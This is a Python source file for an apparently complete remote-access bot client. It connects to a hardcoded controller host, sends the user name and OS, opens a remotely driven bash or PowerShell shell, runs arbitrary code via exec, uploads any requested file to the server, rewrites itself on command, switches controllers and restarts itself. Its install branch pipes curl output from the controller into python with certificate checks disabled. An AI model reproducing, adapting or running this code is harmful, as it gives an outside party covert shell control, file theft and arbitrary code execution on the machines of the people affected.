#!/usr/bin/env python

import socket
import subprocess
import sys
import os
import platform
import shutil
import time
import json
import threading
import struct
import base64
import traceback
import ssl
import getpass
try:
    from StringIO import StringIO
except:
    from io import StringIO

__version__ = "1.2.1"

# HOST = 'renmusxd.ddns.net'
HOST = 'potatos.local'
PORT = 1708
HOSTINFOFILE = '.host'
IDFILE = '.id'
# Commands
STDIN = 'stdin'
EVAL = 'eval'
CMD = 'cmd'
KILL_PROC = 'kill'
HOST_TRANSFER = 'transfer'
ASSIGN_ID = 'assign'
SHUTDOWN = 'shutdown'
# Special
LS_JSON = 'ls'
# Client -> Server
FILE_DOWNLOAD = 'down'
# Server -> Client
FILE_STREAM = 'fstream'
FILE_CLOSE = 'fclose'
FILE_FILENAME = 'fname'
CLIENT_STREAM = 'cstream'
CLIENT_CLOSE = 'cclose'

PRINT_BUFFER = StringIO()

RUNNING = True
RESTART = True
normstdout = sys.stdout
normstderr = sys.stderr

proc = None


# Supporting classes
class FormatSocket:
    SIZE_BYTES = 4
    RECV_SIZE = 2**13

    def __init__(self, sock):
        self.sock = sock
        self.lastbytes = b''

    def format_send(self,msg):
        """
        Takes str or bytes and produces bytes where the first 4 bytes
        correspond to the message length
        :param msg: input message
        :return: <[length][message]>
        """
        if type(msg) == str:
            msg = str.encode(msg)
        if type(msg) == bytes:
            self.sock.sendall(struct.pack('>i', len(msg)) + msg)
        else:
            raise Exception("msg must be of type bytes or str")

    def format_recv(self):
        """
        Receives bytes from recvable, expects first 4 bytes to be length of message,
        then receives that amount of data and returns raw bytes of message
        :param recvable: Any object with recv(bytes) function
        :return:
        """

        total_data = self.lastbytes
        self.lastbytes = b''

        msg_data = b''
        expected_size = sys.maxsize

        if len(total_data) > FormatSocket.SIZE_BYTES:
            size_data = total_data[:FormatSocket.SIZE_BYTES]
            expected_size = struct.unpack('>i',size_data)[0]
            msg_data += total_data[FormatSocket.SIZE_BYTES:]

        while len(msg_data) < expected_size:
            sock_data = self.sock.recv(FormatSocket.RECV_SIZE)

            if not sock_data:
                raise Exception("Connection Severed")

            total_data += sock_data
            if expected_size == sys.maxsize and len(total_data) > FormatSocket.SIZE_BYTES:
                size_data = total_data[:FormatSocket.SIZE_BYTES]
                expected_size = struct.unpack('>i',size_data)[0]
                msg_data += total_data[FormatSocket.SIZE_BYTES:]
            else:
                msg_data += sock_data
        # Store anything above expected size for next time
        self.lastbytes = msg_data[expected_size:]
        return msg_data[:expected_size]

    def close(self):
        self.sock.close()


class AppendDataLock:
    FILLTO = 2**14

    def __init__(self, datinit=bytes):
        """
        Creates a new buffer lock, datinit must be a list-like data type
        :param datinit:
        """
        self.dat = datinit()
        self.lock = threading.Lock()
        self.condition = threading.Condition(self.lock)

    def append(self,dat):
        """
        Adds data to the buffer
        :param dat: data of type :datinit: from constructor
        """
        with self.lock:
            if type(self.dat)!=type(dat):
                if type(self.dat)==bytes and type(dat)==str:
                    dat = dat.encode('UTF-8','ignore')
                elif type(self.dat)==str and type(dat)==bytes:
                    dat = dat.decode('UTF-8','ignore')
            while len(self.dat)>=AppendDataLock.FILLTO:
                self.condition.wait()
            self.dat += dat

    def getdat(self,upto):
        """
        Gets data stored up to :upto: items (characters/bytes/entries) and clears
        :param upto: number of items
        :return: up to :upto: items
        """
        with self.lock:
            if upto > 0:
                temp = self.dat[:upto]
                self.dat = self.dat[upto:]
                self.condition.notify()
                return temp
            return self.dat[:0]

    def empty(self):
        with self.lock:
            return len(self.dat) == 0


class ByteLockBundler:
    PACKET_MAX_DAT = 2**13

    def __init__(self, fsock):
        """
        Creates a new bytelock bundler based on :fsock: as a connection
        to a host
        :param fsock: FormatSocket object
        """
        self.stdoutbytes = AppendDataLock(bytes)
        self.stderrbytes = AppendDataLock(bytes)
        self.printstrs = AppendDataLock(str)
        self.errstrs = AppendDataLock(str)
        self.specialbytes = {}
        self.filebytes = {}
        self.fileclose = []
        self.fsock = fsock
        self.flock = threading.Lock()
        self.slock = threading.Lock()

    def writeStdout(self, wbytes):
        """
        Write to stdout on the server
        :param wbytes: bytes
        """
        self.stdoutbytes.append(wbytes)

    def writeStderr(self, wbytes):
        """
        Write to stderr on the server
        :param wbytes: bytes
        """
        self.stderrbytes.append(wbytes)

    def writePrintstr(self, wstr):
        """
        Write to stdout on the server
        :param wstr: str
        """
        self.printstrs.append(wstr)

    def writeErrstr(self, wstr):
        """
        Write to stderr on the server
        :param wstr: str
        """
        self.errstrs.append(wstr)

    def writeFileup(self, filename, wbytes):
        """
        Upload bytes to the server
        :param filename: filename being written
        :param wbytes: chunk of bytes for file
        """
        with self.flock:
            if filename not in self.filebytes:
                self.filebytes[filename] = AppendDataLock()
            bl = self.filebytes[filename]
        bl.append(wbytes)

    def writeSpecial(self, name, wbytes):
        """
        Special commands that must be sent in entirety
        :param name: name of command
        :param wbytes: bytes of command
        """
        with self.slock:
            self.specialbytes[name] = wbytes.decode('UTF-8')

    def closeFile(self, filename):
        """
        Indicate to the server a file should be closed
        :param filename: name of file to close
        """
        with self.flock:
            if filename not in self.fileclose:
                self.fileclose.append(filename)

    def getAndClear(self, bytesize=4096):
        """
        Get items from data buffers up to bytesize total and clear
        :param bytesize: total number of bytes (approx x2) to be written
        :return: dataremaining (bool), datawritten (bool), writedict (dict)
        """
        specialremaining = False
        specs = {}
        with self.slock:
            for specialname in self.specialbytes.keys():
                if len(specs)==0 or len(self.specialbytes[specialname]) <= bytesize:
                    specs[specialname] = self.specialbytes[specialname]
                    bytesize -= len(specs[specialname])
            for specialname in specs.keys():
                self.specialbytes.pop(specialname)
            if len(self.specialbytes)>0:
                specialremaining = True

        printout = self.printstrs.getdat(bytesize)
        bytesize -= len(printout)

        errout = self.errstrs.getdat(bytesize)
        bytesize -= len(errout)

        out = self.stdoutbytes.getdat(bytesize)
        bytesize -= len(out)

        err = self.stderrbytes.getdat(bytesize)
        bytesize -= len(err)

        with self.flock:
            filestream = {}
            fileclose = []
            filenames = list(self.filebytes.keys())
            for filename in filenames:
                filebytes = self.filebytes[filename].getdat(bytesize)
                bytesize -= len(filebytes)
                if self.filebytes[filename].empty() and filename in self.fileclose:
                    self.fileclose.remove(filename)
                    self.filebytes.pop(filename)
                    fileclose.append(filename)
                wfilebytes = base64.b64encode(filebytes)
                filestream[filename] = wfilebytes

        # Abuse python to convert to strings
        # printout = printout.decode('UTF-8')
        # errout = errout.decode('UTF-8')
        out = out.decode('UTF-8')
        err = err.decode('UTF-8')
        for filename in filestream.keys():
            # Take bytes, encode using base64, decode into string for json
            filestream[filename] = filestream[filename].decode('UTF-8')

        dataremaining = (bytesize <= 0) or specialremaining
        datawritten = (bytesize < ByteLockBundler.PACKET_MAX_DAT)
        writedict = dict(printout=printout,
                         errout=errout,
                         stdout=out,
                         stderr=err,
                         filestreams=filestream,
                         fileclose=fileclose,
                         special=specs)
        return dataremaining, datawritten, writedict

    def writeBundle(self):
        """
        Takes data from buffers and sends to server
        :return: boolean if data is remaining in the buffers
        """
        dataremaining, datawritten, writedict = self.getAndClear()
        if datawritten:
            json_str = json.dumps(writedict)
            self.fsock.format_send(json_str)
        return dataremaining


class PayloadLib:
    def __init__(self, bytelock):
        """
        Create payload lib
        :param bytelock: bytelock to use for forwarding files
        """
        self.bytelock = bytelock
        self.fileloc = __file__
        self.pythonpath = sys.executable
        self.requested_shutdown = False
        self.user = getpass.getuser()

    def upload(self, filename,blocking=False):
        filename = os.path.abspath(os.path.expanduser(filename))
        if os.path.exists(filename):
            filesize = os.stat(filename).st_size
            jsonstr = json.dumps(dict(filename=filename, filesize=filesize))
            self.bytelock.writeSpecial('filesize', jsonstr.encode('UTF-8'))
            def downloadfunc():
                with open(filename, 'rb') as f:
                    dat = f.read(ByteLockBundler.PACKET_MAX_DAT)
                    while len(dat) > 0:
                        self.bytelock.writeFileup(filename, dat)
                        dat = f.read(ByteLockBundler.PACKET_MAX_DAT)
                    self.bytelock.closeFile(filename)
            if blocking:
                downloadfunc()
            else:
                t = threading.Thread(target=downloadfunc)
                t.start()
            return True
        return False


class WriterWrapper:
    """
    A special wrapper function to use as stdout/stderr
    """
    def __init__(self, writefunc):
        self.func = writefunc

    def write(self, wstr):
        try:
            for f in self.func:
                f(wstr)
        except TypeError:
            self.func(wstr)


# Scripts
def main(host=HOST, port=PORT, botid=None, altuser=None):
    """
    Main loop, checks internet and attempts to connect to server,
    on error continues to check every minute
    :param host: server addr
    :param port: server port
    :param botid: id if set, else None
    """
    while RUNNING:
        if hasInternetConnection():
            try:
                # Get and send info
                user, arch = getInfo()
                if altuser is not None:
                    if altuser != user:
                        user = altuser + " (" + user + ")"
                else:
                    altuser = user
                infodict = dict(user=user, arch=arch, version=__version__, bid=botid)
                json_str = json.dumps(infodict)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                sslbyte = s.recv(1)
                if sslbyte != b'\x00':
                    s = ssl.wrap_socket(s)
                fs = FormatSocket(s)
                fs.format_send(json_str)
                serve(fs,altuser)
            except Exception as e:
                sys.stderr.write("[!] "+str(e) + "\n")
        if RUNNING:
            # Try again in a minute
            time.sleep(10)


def serve(sock,user):
    """
    Check the socket, setup various processes, run commands as requested,
    exits on autoupdate or host transfer.
    :param sock: socket to check
    """
    global proc

    bytelock = ByteLockBundler(sock)
    payloadlib = PayloadLib(bytelock)
    sys.stdout = WriterWrapper([lambda s: bytelock.writePrintstr(s),sys.stdout.write])
    sys.stderr = WriterWrapper([lambda s: bytelock.writeErrstr(s),sys.stderr.write])

    executable = "bash"
    if os.name == 'nt':
        executable = "powershell.exe"

    proc = subprocess.Popen([executable],
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            cwd=os.path.expanduser("~"))
    proclock = threading.Lock()

    # Get commands from server, parse and send appropriate to proc
    def pollProcStdout():
        """Check process output"""
        while RUNNING:
            with proclock:
                reader = proc.stdout
            out = reader.read(1)
            with proclock:
                if out == '' and proc.poll() is not None:
                    break
            if out != '':
                bytelock.writeStdout(out)

    def pollProcStderr():
        """Check process output"""
        while RUNNING:
            with proclock:
                reader = proc.stderr
            out = reader.read(1)
            with proclock:
                if out == '' and proc.poll() is not None:
                    break
            if out != '':
                bytelock.writeStderr(out)

    def pollSock():
        """Check socket output and respond to queries"""
        global RUNNING
        global RESTART
        global proc
        fileobjs = {}
        clientobj = None
        while RUNNING:
            try:
                recvbytes = sock.format_recv()
                recvjson = json.loads(recvbytes.decode('UTF-8'))

                # Special LS command
                if LS_JSON in recvjson:
                    filedict = {}
                    filepath = os.path.abspath(os.path.expanduser(recvjson[LS_JSON]))
                    if os.path.isdir(filepath):
                        try:
                            # Throws exception when permission denied on folder
                            ls = os.listdir(filepath)
                            for hostfile in (os.path.join(filepath, f) for f in ls):
                                try:
                                    retstat = os.stat(hostfile)
                                    retval = (os.path.isdir(hostfile), retstat.st_mode, retstat.st_size)
                                    filedict[hostfile] = retval
                                except OSError:
                                    # This can happen if you have really weird files, trust me
                                    pass
                        except:
                            pass

                    specentry = json.dumps((filepath, filedict)).encode('UTF-8')
                    bytelock.writeSpecial("ls",specentry)
                if KILL_PROC in recvjson:
                    with proclock:
                        proc.kill()
                        proc = subprocess.Popen([executable],
                                                stdin=subprocess.PIPE,
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE,
                                                cwd=os.path.expanduser("~"))
                if HOST_TRANSFER in recvjson:
                    hostaddr = recvjson[HOST_TRANSFER][0]
                    hostport = int(recvjson[HOST_TRANSFER][1])
                    try:
                        with open(HOSTINFOFILE,"w") as hostfile:
                            hostfile.write(hostaddr + "\n")
                            hostfile.write(str(hostport))
                    except IOError as e:
                        sys.stderr.write("[!] Could not write to "+HOSTINFOFILE+"\n")
                        sys.stderr.write(str(e) + "\n")
                    # Restart
                    RUNNING = False
                if ASSIGN_ID in recvjson:
                    id = recvjson[ASSIGN_ID]
                    try:
                        with open(IDFILE,"w") as idfile:
                            idfile.write(id + "\n")
                            idfile.write(user)
                    except IOError as e:
                        sys.stderr.write("[!] Could not write to "+IDFILE+"\n")
                        sys.stderr.write(str(e)+"\n")
                # Standard evaluation
                if STDIN in recvjson:
                    with proclock:
                        proc.stdin.write(recvjson[STDIN].encode('UTF-8'))
                        proc.stdin.flush()
                if CMD in recvjson:
                    cmd_str = recvjson[CMD]
                    cmd_arr = cmd_str.split(" ")
                    newproc = subprocess.Popen(cmd_arr)
                if EVAL in recvjson:
                    def execfunc():
                        try:
                            exec(recvjson[EVAL]) in {'payloadlib':payloadlib}
                        except Exception as e:
                            tb = traceback.format_exc()
                            sys.stderr.write(tb)
                    t = threading.Thread(target=execfunc)
                    t.start()

                # It is important that FILE_CLOSE comes *after* FILE_FILENAME
                if FILE_FILENAME in recvjson:
                    filename = recvjson[FILE_FILENAME]
                    if filename not in fileobjs:
                        fileobjs[filename] = open(filename,'wb')
                    fobj = fileobjs[filename]
                    bstr = recvjson[FILE_STREAM]
                    b64bytes = base64.b64decode(bstr)
                    fobj.write(b64bytes)
                if FILE_CLOSE in recvjson:
                    filename = recvjson[FILE_CLOSE]
                    if filename in fileobjs:
                        fileobjs[filename].close()
                        fileobjs.pop(filename)

                # It is important that CLIENT_CLOSE comes *after* CLIENT_STREAM
                if CLIENT_STREAM in recvjson:
                    if clientobj is None:
                        clientobj = open(os.path.abspath(__file__),"wb")
                    bstr = recvjson[CLIENT_STREAM]
                    clientobj.write(bstr.encode('UTF-8'))
                if CLIENT_CLOSE in recvjson and clientobj is not None:
                    clientobj.close()
                    RUNNING = False

                if FILE_DOWNLOAD in recvjson:
                    filename = recvjson[FILE_DOWNLOAD]
                    payloadlib.upload(filename)

                if SHUTDOWN in recvjson:
                    RUNNING = False
                    RESTART = False

            except Exception as e:
                sys.stderr.write("[!] " + str(e) + "\n")
                RUNNING = False

            if not RUNNING:
                with proclock:
                    proc.kill()
                bytelock.fsock.close()

    def writeBundles():
        """Write output to json and send home"""
        remains = True
        while RUNNING:
            if not remains:
                time.sleep(0.1)
            remains = bytelock.writeBundle()

    # make thread for each function + one to send json with output to server
    t_sock = threading.Thread(target=pollSock)
    t_procout = threading.Thread(target=pollProcStdout)
    t_procerr = threading.Thread(target=pollProcStderr)
    t_bndl = threading.Thread(target=writeBundles)

    t_sock.start()
    t_procout.start()
    t_procerr.start()
    t_bndl.start()

    t_sock.join()
    # t_procout.join()
    # t_procerr.join()
    # t_bndl.join()


def getInfo():
    """Get information about system"""
    user = getpass.getuser()
    if platform.system() == 'Darwin':
        arch = 'OSX ' + platform.mac_ver()[0] + ' ' + platform.mac_ver()[2]
    else:
        arch = platform.system() + " " + platform.release()
    return user, arch


def hasInternetConnection():
    """Check google for internet connection"""
    try:
        socket.getaddrinfo("google.com", 80)
        return True
    except:
        return False

if __name__ == "__main__":
    if "-install" in sys.argv:
        # Legacy
        os.system('python -c "$(curl -k https://{}/client/install.py)"'.format(HOST))
    else:
        hostaddr = HOST
        hostport = PORT
        bid = None
        if os.path.exists(HOSTINFOFILE):
            with open(HOSTINFOFILE, "r") as f:
                lines = [s.strip() for s in f.readlines()]
            try:
                checkaddr = lines[0]
                checkport = int(lines[1])
                hostaddr = checkaddr
                hostport = checkport
            except:
                pass
        altuser = None
        if os.path.exists(IDFILE):
            with open(IDFILE,"r") as f:
                bid = f.readline().strip()
                try:
                    altuser = f.readline().strip()
                except:
                    altuser = None
        main(hostaddr,hostport,bid,altuser)
        if (not RUNNING) and RESTART:
            os.execv(sys.executable, [sys.executable] + sys.argv)
